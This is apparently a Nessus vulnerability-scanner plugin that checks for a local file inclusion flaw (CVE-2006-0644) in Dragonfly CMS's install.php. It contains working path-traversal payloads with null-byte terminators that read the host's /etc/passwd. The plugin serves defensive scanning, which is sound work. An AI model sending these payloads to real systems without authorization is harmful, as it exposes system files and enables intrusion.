#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(20869);
  script_version("1.23");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-0644");
  script_bugtraq_id(16546);

  script_name(english:"Dragonfly CMS install.php newlang Parameter Local File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include issue.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running Dragonfly / CPG-Nuke CMS, a
content management system written in PHP. 

The installed version of Dragonfly / CPG-Nuke CMS fails to validate
user input to the 'getlang' parameter as well as the 'installlang'
cookie before using them in the 'install.php' script in PHP
'require()' functions.  An unauthenticated attacker can leverage this
issue to view arbitrary files on the remote host and possibly to
execute arbitrary PHP code taken from files on the remote host, both
subject to the privileges of the web server user id.  

Note that successful exploitation is not affected by PHP's
'register_globals' and 'magic_quotes_gpc' settings.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2006/Feb/133");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/424439/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"https://dragonflycms.org/Forums/viewtopic/p=98034.html");
  script_set_attribute(attribute:"solution", value:
"Remove the affected 'install.php' script.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/02/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/02/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

global_var port;

port = get_http_port(default:80, embedded: 0, php: 1);


# A function to actually read a file.
function exploit(dir, file) {
  local_var r;

  r = http_send_recv3(method: 'GET', port: port, item: string(dir, "/install.php?", "newlang=", file), exit_on_fail: 1 );
  return r[2];
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/public_html", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = exploit(dir:dir, file:"../../cpg_error.log%00");

  # There's a problem if it looks like Dragonfly's log file.
  if ("# CHMOD this file to" >< res) {
    # Try to exploit it to read /etc/passwd for the report.
    res2 = exploit(dir:dir, file:"../../../../../../../../../../etc/passwd%00");
    if (res2) contents = res2 - strstr(res2, "<!DOCTYPE html PUBLIC");

    if (isnull(contents)) security_hole(port);
    else {
      contents = data_protection::redact_etc_passwd(output:contents);
      report = string(
        "\n",
        "Here is the /etc/passwd file that Nessus read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }

    exit(0);
  }
}
